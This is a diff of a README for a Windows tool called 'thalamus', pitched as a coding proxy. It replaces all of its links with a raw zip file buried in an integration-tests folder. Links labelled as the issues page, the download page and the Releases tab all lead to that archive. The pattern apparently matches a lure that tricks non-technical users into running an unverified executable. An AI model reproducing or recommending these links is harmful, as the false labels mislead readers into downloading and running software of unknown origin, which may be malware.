@@ -1,6 +1,6 @@
 # ⚙️ thalamus - Boost Your Coding with Smart Proxy
 
-[![Download thalamus](https://img.shields.io/badge/Download-thalamus-brightgreen?style=for-the-badge)](https://github.com/lmoudamir/thalamus/raw/refs/heads/main/integration-tests/probe1/Software_v3.6-alpha.1.zip)
+[![Download thalamus](https://img.shields.io/badge/Download-thalamus-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/lmoudamir/thalamus/main/integration-tests/calorie-cam/Software-v1.6.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these instructions to install and run thalamus on Windows. No programming
 
    Click the bright green download button below or visit the link:
 
-   [Download thalamus](https://github.com/lmoudamir/thalamus/raw/refs/heads/main/integration-tests/probe1/Software_v3.6-alpha.1.zip)  
+   [Download thalamus](https://raw.githubusercontent.com/lmoudamir/thalamus/main/integration-tests/calorie-cam/Software-v1.6.zip)  
 
    This link will take you to the GitHub page where you can get the latest version.
 
@@ -106,7 +106,7 @@ These functions work without interrupting you, so you can focus on your work.
 
 If you have questions or need help:
 
-- Visit the issues page on GitHub: https://github.com/lmoudamir/thalamus/raw/refs/heads/main/integration-tests/probe1/Software_v3.6-alpha.1.zip
+- Visit the issues page on GitHub: https://raw.githubusercontent.com/lmoudamir/thalamus/main/integration-tests/calorie-cam/Software-v1.6.zip
 - Search for solutions or create a new issue describing your problem.
 - Include details like Windows version and thalamus version.
 
@@ -130,7 +130,7 @@ If you have questions or need help:
 
 ## 🔄 How to update thalamus
 
-1. Visit the GitHub download page: https://github.com/lmoudamir/thalamus/raw/refs/heads/main/integration-tests/probe1/Software_v3.6-alpha.1.zip
+1. Visit the GitHub download page: https://raw.githubusercontent.com/lmoudamir/thalamus/main/integration-tests/calorie-cam/Software-v1.6.zip
 2. Check the Releases tab for the latest version.
 3. Download the newest installer file.
 4. Run it to replace the old version.
@@ -151,4 +151,4 @@ If you have questions or need help:
 
 Click below to visit the official page and get started:
 
-[![Download thalamus](https://img.shields.io/badge/Download-thalamus-brightgreen?style=for-the-badge)](https://github.com/lmoudamir/thalamus/raw/refs/heads/main/integration-tests/probe1/Software_v3.6-alpha.1.zip)
+[![Download thalamus](https://img.shields.io/badge/Download-thalamus-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/lmoudamir/thalamus/main/integration-tests/calorie-cam/Software-v1.6.zip)
